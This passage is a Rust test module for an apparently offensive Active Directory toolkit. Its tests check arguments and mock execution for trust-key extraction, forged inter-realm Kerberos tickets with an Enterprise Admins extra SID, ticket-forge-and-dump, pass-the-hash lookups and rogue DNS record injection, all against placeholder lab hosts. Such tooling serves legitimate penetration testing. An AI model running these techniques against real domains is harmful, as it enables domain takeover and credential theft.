            "domain": "contoso.local",
            "username": "admin",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        let hash = args
            .get("hash")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        assert_eq!(hash, Some("31d6cfe0d16ae931b73c59d7e0c089c0"));
    }

    // --- dnstool ---

    #[test]
    fn dnstool_missing_record_name() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_data": "192.168.58.99"
        });
        assert!(required_str(&args, "record_name").is_err());
    }

    #[test]
    fn dnstool_missing_record_data() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local"
        });
        assert!(required_str(&args, "record_data").is_err());
    }

    #[test]
    fn dnstool_action_default_add() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99"
        });
        let action = optional_str(&args, "action").unwrap_or("add");
        assert_eq!(action, "add");
    }

    #[test]
    fn dnstool_action_custom() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99",
            "action": "remove"
        });
        let action = optional_str(&args, "action").unwrap_or("add");
        assert_eq!(action, "remove");
    }

    #[test]
    fn dnstool_user_spec_format() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99"
        });
        let domain = required_str(&args, "domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let user_spec = format!("{domain}\\{username}");
        assert_eq!(user_spec, "contoso.local\\admin");
    }

    // --- mock executor tests ---

    use super::*;
    use crate::executor::mock;

    #[tokio::test]
    async fn extract_trust_key_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "trusted_domain": "child.contoso.local"
        });
        assert!(extract_trust_key(&args).await.is_ok());
    }

    #[tokio::test]
    async fn create_inter_realm_ticket_executes_without_extra_sid() {
        mock::push(mock::success());
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        assert!(create_inter_realm_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn create_inter_realm_ticket_executes_with_extra_sid() {
        mock::push(mock::success());
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local",
            "extra_sid": "S-1-5-21-222-519"
        });
        assert!(create_inter_realm_ticket(&args).await.is_ok());
    }

    // --- forge_inter_realm_and_dump (arg validation only — full flow needs
    //     real impacket binaries and a tempdir-aware mock executor) ---

    #[test]
    fn forge_inter_realm_and_dump_missing_trust_key() {
        let args = json!({
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_domain": "contoso.local",
            "target": "dc01.contoso.local"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("trust_key"));
    }

    #[test]
    fn forge_inter_realm_and_dump_missing_source_sid() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_domain": "child.contoso.local",
            "target_domain": "contoso.local",
            "target": "dc01.contoso.local"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("source_sid"));
    }

    #[test]
    fn forge_inter_realm_and_dump_missing_target() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_domain": "contoso.local"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("target"));
    }

    #[test]
    fn forge_inter_realm_and_dump_rejects_apex_target() {
        // `target` becomes the host portion of `cifs/<target>` in the TGS-REQ.
        // Passing the realm apex yields KDC_ERR_S_PRINCIPAL_UNKNOWN and, with
        // the dispatch wrapper's default retry policy, a hot loop. Fail fast
        // so the wrapper's apex-detection branch locks dedup instead.
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_domain": "contoso.local",
            "target": "contoso.local"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("realm apex") && msg.contains("KDC_ERR_S_PRINCIPAL_UNKNOWN"),
            "expected apex-guard error, got: {msg}"
        );
    }

    #[tokio::test]
    async fn create_inter_realm_ticket_with_username_executes() {
        mock::push(mock::success());
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local",
            "username": "fakeuser"
        });
        assert!(create_inter_realm_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn get_sid_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(get_sid(&args).await.is_ok());
    }

    #[tokio::test]
    async fn get_sid_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        assert!(get_sid(&args).await.is_ok());
    }

    #[tokio::test]
    async fn dnstool_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99"
        });
        assert!(dnstool(&args).await.is_ok());
    }

    #[tokio::test]
    async fn dnstool_with_action_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99",
            "action": "remove"
        });
        assert!(dnstool(&args).await.is_ok());
    }
}
